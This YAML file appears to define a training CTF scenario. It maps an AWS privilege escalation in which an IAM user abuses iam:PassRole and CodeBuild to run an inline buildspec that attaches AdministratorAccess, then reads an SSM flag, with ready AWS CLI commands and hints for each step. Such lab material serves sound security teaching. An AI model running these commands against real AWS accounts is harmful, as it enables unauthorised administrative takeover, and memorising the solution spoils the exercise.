attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has codebuild:CreateProject, codebuild:StartBuild, and iam:PassRole
        permissions, allowing it to create a CodeBuild project with a privileged service
        role and execute a malicious buildspec to escalate privileges.

    - id: codebuild-project
      label: "CodeBuild Project"
      type: resource
      subType: codebuild-project
      arn: "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-001-privesc-project"
      description: >
        A CodeBuild project created by the attacker and configured to run with the
        privileged target role. The project executes a custom buildspec that uses the
        role's IAM permissions to attach AdministratorAccess to the starting user.

    - id: target-role
      label: "Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role"
      description: >
        A privileged IAM role that trusts the CodeBuild service. It has iam:AttachUserPolicy
        permission, which allows it to attach managed policies to IAM users. By passing this
        role to the CodeBuild project and starting a build, the attacker causes CodeBuild to
        assume this role and execute the malicious buildspec — attaching AdministratorAccess
        to the starting user — giving the attacker admin-equivalent permissions used to read
        the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/codebuild-001-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: codebuild-project
      label: "codebuild:CreateProject + iam:PassRole"
      description: >
        Create a new CodeBuild project and pass the privileged target role as its
        service role. This binds the role's permissions to any builds executed within
        this project.
      hints:
        - "Create a CodeBuild project with --service-role pointing to the privileged target role (iam:PassRole) and source type=NO_SOURCE with an inline buildspec that runs iam:AttachUserPolicy to grant AdministratorAccess to your starting user. No source repository is required."
        - "Start the build with codebuild:StartBuild, then poll codebuild:BatchGetBuilds until buildStatus reaches SUCCEEDED. Wait ~15 seconds for IAM policy propagation before verifying the escalation."
        - "Browse to https://pathfinding.cloud/paths/codebuild-001 for technique details."
      commands:
        - description: "Create CodeBuild project with the privileged service role"
          command: |
            aws codebuild create-project \
              --name pl-privesc-codebuild-demo \
              --source type=NO_SOURCE,buildspec="version: 0.2\nphases:\n  build:\n    commands:\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" \
              --artifacts type=NO_ARTIFACTS \
              --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0 \
              --service-role arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role

    - from: codebuild-project
      to: target-role
      label: "codebuild:StartBuild → iam:AttachUserPolicy"
      description: >
        Start a build on the project. CodeBuild assumes the target role for the duration
        of the build. The buildspec executes iam:AttachUserPolicy under the role's
        permissions, attaching AdministratorAccess to the starting user.
      hints: []
      commands:
        - description: "Start the build to execute the privilege escalation"
          command: "aws codebuild start-build --project-name pl-privesc-codebuild-demo --output json"
        - description: "Poll until the build completes"
          command: "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus' --output text"
        - description: "Verify administrator access"
          command: "aws iam list-users --max-items 1"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the parameter name /pathfinding-labs/flags/codebuild-001-to-admin to retrieve the flag."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/codebuild-001-to-admin --query 'Parameter.Value' --output text"
